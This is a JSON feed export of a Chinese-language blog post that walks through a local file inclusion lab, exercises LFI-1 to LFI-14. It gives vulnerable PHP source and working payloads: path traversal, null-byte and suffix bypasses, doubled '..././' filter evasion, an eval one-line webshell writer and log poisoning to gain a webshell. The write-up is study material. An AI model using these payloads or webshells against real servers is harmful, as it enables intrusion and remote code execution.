{
    "version": "https://jsonfeed.org/version/1",
    "title": "My Violet Eva Garden • All posts by \"文件包含探究\" category",
    "description": "",
    "home_page_url": "https://kiyomijin.github.io",
    "items": [
        {
            "id": "https://kiyomijin.github.io/2022/10/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8E%A2%E7%A9%B6/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%9B%E9%98%B6%EF%BC%88%E4%B8%80%EF%BC%89/",
            "url": "https://kiyomijin.github.io/2022/10/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8E%A2%E7%A9%B6/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%9B%E9%98%B6%EF%BC%88%E4%B8%80%EF%BC%89/",
            "title": "文件包含进阶（一）",
            "date_published": "2022-10-20T15:49:56.000Z",
            "content_html": "<h1 id=\"文件包含漏洞\"><a class=\"markdownIt-Anchor\" href=\"#文件包含漏洞\">#</a> 文件包含漏洞</h1>\n<h2 id=\"lfi-1\"><a class=\"markdownIt-Anchor\" href=\"#lfi-1\">#</a> LFI-1</h2>\n<p>查看后台源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>     <span class=\"keyword\">include</span>(<span class=\"string\">&quot;../common/header.php&quot;</span>);   <span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- <span class=\"keyword\">from</span> https:<span class=\"comment\">//pentesterlab.com/exercises/php_include_and_post_exploitation/course --&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"title function_ invoke__\">hint</span>(<span class=\"string\">&quot;will include the arg specified in the GET parameter \\&quot;page\\&quot;&quot;</span>); <span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;form action=<span class=\"string\">&quot;/LFI-1/index.php&quot;</span> method=<span class=\"string\">&quot;GET&quot;</span>&gt;</span><br><span class=\"line\">    &lt;input type=<span class=\"string\">&quot;text&quot;</span> name=<span class=\"string\">&quot;page&quot;</span>&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;page&quot;</span>]);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>请求 form 表单， <code>GET</code>  方式，请求 <code>index.php</code>  时，会调用 php 的 <code>include($_GET[&quot;page&quot;].&quot;.html&quot;);</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//www.lfi.com/LFI-1/?page=../phpinfo.php</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221019234908422.png\" alt=\"image-20221019234908422\"></p>\n<h2 id=\"lfi-2\"><a class=\"markdownIt-Anchor\" href=\"#lfi-2\">#</a> LFI-2</h2>\n<p>参数是 <code>library</code></p>\n<p>由于 Hint 是 %00 截断，那么我们尝试：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-2/?library=../../../boot.ini%00</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020000125556.png\" alt=\"image-20221020000125556\"></p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-2/?library=../../../phpinfo.php%00</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020000057865.png\" alt=\"image-20221020000057865\"></p>\n<p>那么我们可以任意文件包含，去包含 webshell.php</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-2/?library=../../../webshell.php%00</span><br></pre></td></tr></table></figure>\n<p>使用菜刀连接：</p>\n<p><img src=\"image-20221020000532196.png\" alt=\"image-20221020000532196\"></p>\n<p>从这题可以看到，文件包含本质是利用文件包含 <code>include</code> 、 <code>require</code>  等漏洞来进行<strong>文件上传</strong>或<strong>文件访问</strong></p>\n<h2 id=\"lfi-3\"><a class=\"markdownIt-Anchor\" href=\"#lfi-3\">#</a> LFI-3</h2>\n<p>查看 Hint</p>\n<p><img src=\"image-20221020000927815.png\" alt=\"image-20221020000927815\"></p>\n<p>查看后台源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">substr</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>], -<span class=\"number\">4</span>, <span class=\"number\">4</span>) != <span class=\"string\">&#x27;.php&#x27;</span>)<span class=\"comment\">//从结尾倒数第四个开始，取4个长度</span></span><br><span class=\"line\"> <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>]);</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\"> <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;You are not allowed to see source files!&#x27;</span>.<span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>代码核心逻辑讲了：</p>\n<p>从 <code>GET</code>  获取到的 <code>file</code>  参数内容里截取倒数第 4 个开始，取 4 个长度的子字符串</p>\n<p>将此字符串和 <code>.php</code>  (4 个字符) 进行比较 ——</p>\n<ul>\n<li>如果相等则显示 “You are not allowed to see source files!”</li>\n<li>否则调用 <code>file_get_contents</code>  显示文件内容，或者如果是 <code>php</code>  的话前台浏览器会解析 <code>php</code>  代码</li>\n</ul>\n<p>那么，利用点就是 <code>过掉这个if条件判断</code> 。</p>\n<p>首先，我们先确定相对路径：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-3/index.php?file=../../../../boot.ini</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020001601472.png\" alt=\"image-20221020001601472\"></p>\n<p>然后将 <code>boot.ini</code>  替换成 <code>phpinfo.php</code> ，注意加 <code>/.</code></p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-3/index.php?file=../../../../phpinfo.php/.</span><br></pre></td></tr></table></figure>\n<p>查看页面源代码，成功解析 php 代码：</p>\n<p><img src=\"image-20221020002018746.png\" alt=\"image-20221020002018746\"></p>\n<p>理论上，可以用任何多余特殊字符绕过：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-3/index.php?file=../../../../phpinfo.php.</span><br><span class=\"line\">http://www.lfi.com/LFI-3/index.php?file=../../../../phpinfo.php+</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n<p>均成功解析 php</p>\n<h2 id=\"lfi-4\"><a class=\"markdownIt-Anchor\" href=\"#lfi-4\">#</a> LFI-4</h2>\n<p>直接查看源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$path</span> = <span class=\"string\">&#x27;includes/class_&#x27;</span>.<span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;class&#x27;</span>]).<span class=\"string\">&#x27;.php&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$path</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>核心逻辑</strong>：</p>\n<p>拼接 <code>includes/class_</code>  + <code>经过addslashes处理的GET请求参数class</code>  +  <code>.php</code></p>\n<p>然后使用 <code>file_get_contents</code>  函数回显这个拼接路径文件</p>\n<p><strong>注意</strong>： <code>addslashes</code>  可以对 <code>双引号</code> 、 <code>单引号</code> 、 <code>反斜杠</code> 、 <code>NULL</code>  前面加一个 <code>反斜杠</code> 进行转义</p>\n<p>那么由于后面已经有 <code>.php</code> ，所以我们只需要构造 <code>phpinfo</code> ，并尝试相对路径：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-4/?class=../../../../../phpinfo</span><br></pre></td></tr></table></figure>\n<p>成功解析到 <code>php</code>  代码</p>\n<p><img src=\"image-20221020003703322.png\" alt=\"image-20221020003703322\"></p>\n<h2 id=\"lfi-5\"><a class=\"markdownIt-Anchor\" href=\"#lfi-5\">#</a> LFI-5</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">   <span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&#x27;../&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>]);</span><br><span class=\"line\">   <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$file</span>))</span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">       <span class=\"keyword\">include</span>(<span class=\"string\">&quot;pages/<span class=\"subst\">$file</span>&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">else</span></span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">       <span class=\"keyword\">include</span>(<span class=\"string\">&quot;index.php&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>可以看到，此题将 <code>../</code>  过滤成 <code>空</code> ，一般过滤成空的，我们可以通过双写来绕过。</p>\n<p>那么有</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-5/?file=..././..././..././phpinfo.php</span><br></pre></td></tr></table></figure>\n<p>成功显示 <code>phpinfo</code>  界面</p>\n<p><img src=\"image-20221020004759481.png\" alt=\"image-20221020004759481\"></p>\n<h2 id=\"lfi-6\"><a class=\"markdownIt-Anchor\" href=\"#lfi-6\">#</a> LFI-6</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;page&quot;</span>]);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>核心逻辑：</p>\n<p>使用 <code>POST</code>  来传递参数，和 <code>LFI-1</code>  差不多。</p>\n<p><img src=\"image-20221020005136900.png\" alt=\"image-20221020005136900\"></p>\n<p>那么可以构造：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">page=../../phpinfo.php</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020005213444.png\" alt=\"image-20221020005213444\"></p>\n<p>如何在服务器上写入一句话木马文件呢？</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">    <span class=\"title function_ invoke__\">fputs</span>(<span class=\"title function_ invoke__\">fopen</span>(<span class=\"string\">&#x27;myshell.php&#x27;</span>,<span class=\"string\">&#x27;w&#x27;</span>),<span class=\"string\">&#x27;&lt;?php @eval($_POST[JACK]);?&gt;&#x27;</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020010044983.png\" alt=\"image-20221020010044983\"></p>\n<p>后续使用菜刀连接即可。</p>\n<h2 id=\"lfi-7\"><a class=\"markdownIt-Anchor\" href=\"#lfi-7\">#</a> LFI-7</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">library=../../../boot.ini%00</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020010438974.png\" alt=\"image-20221020010438974\"></p>\n<p>构造：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">library=../../../phpinfo.php%00</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020010511820.png\" alt=\"image-20221020010511820\"></p>\n<h2 id=\"lfi-8\"><a class=\"markdownIt-Anchor\" href=\"#lfi-8\">#</a> LFI-8</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">file=../../../../phpinfo.php/.</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020010823561.png\" alt=\"image-20221020010823561\"></p>\n<h2 id=\"lfi-9\"><a class=\"markdownIt-Anchor\" href=\"#lfi-9\">#</a> LFI-9</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">class=../../../../../phpinfo</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020010958041.png\" alt=\"image-20221020010958041\"></p>\n<h2 id=\"lfi-10\"><a class=\"markdownIt-Anchor\" href=\"#lfi-10\">#</a> LFI-10</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">file=..././..././..././phpinfo.php</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020011102011.png\" alt=\"image-20221020011102011\"></p>\n<h2 id=\"lfi-11\"><a class=\"markdownIt-Anchor\" href=\"#lfi-11\">#</a> LFI-11</h2>\n<p>这题使用了隐藏字段进行传递参数</p>\n<p><img src=\"image-20221020011255262.png\" alt=\"image-20221020011255262\"></p>\n<p>那么可以有：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">stylepath=../../../../phpinfo.php</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020011208724.png\" alt=\"image-20221020011208724\"></p>\n<h2 id=\"lfi-12\"><a class=\"markdownIt-Anchor\" href=\"#lfi-12\">#</a> LFI-12</h2>\n<p>还是使用隐藏字段传递，只不过变成了 <code>GET</code>  型</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-12/?stylepath=../../../../phpinfo.php</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020011415134.png\" alt=\"image-20221020011415134\"></p>\n<h2 id=\"lfi-13\"><a class=\"markdownIt-Anchor\" href=\"#lfi-13\">#</a> LFI-13</h2>\n<p>依旧是双写：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-13/?file=..././..././..././phpinfo.php</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020011537265.png\" alt=\"image-20221020011537265\"></p>\n<h2 id=\"lfi-14\"><a class=\"markdownIt-Anchor\" href=\"#lfi-14\">#</a> LFI-14</h2>\n<p>变成了 <code>POST</code>  型，使用双写绕过：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">file=..././..././..././phpinfo.php</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020011651144.png\" alt=\"image-20221020011651144\"></p>\n<h2 id=\"包含日志文件获取webshell\"><a class=\"markdownIt-Anchor\" href=\"#包含日志文件获取webshell\">#</a> 包含日志文件获取 webshell</h2>\n<p><img src=\"image-20221020011757179.png\" alt=\"image-20221020011757179\"></p>\n<p>我们通过 <code>httpd-vhosts.conf</code>  可以知道：</p>\n<p><img src=\"image-20221020012214942.png\" alt=\"image-20221020012214942\"></p>\n<p>我们的网页日志存储在 <code>logs/dummy-host2.asdf-access.log</code>  中</p>\n<p>那么我们通过文件包含去请求一句话木马，看是否会留下痕迹？</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-1/?page=&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>\n<p>那我们构造：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-1/?page=<span class=\"meta\">&lt;?php @eval($_POST[jack]);?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>接着查看：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-1/?page=../../../Apache/logs/dummy-host2.asdf-access.log</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020013521115.png\" alt=\"image-20221020013521115\"></p>\n<p>发现 <code>尖括号</code> 和 <code>空格</code> 会被 URL 编码，这时候我们使用 <code>BP</code>  抓包修改</p>\n<p><img src=\"image-20221020013627512.png\" alt=\"image-20221020013627512\"></p>\n<p><img src=\"image-20221020014143191.png\" alt=\"image-20221020014143191\"></p>\n",
            "tags": [
                "文件包含探究"
            ]
        }
    ]
}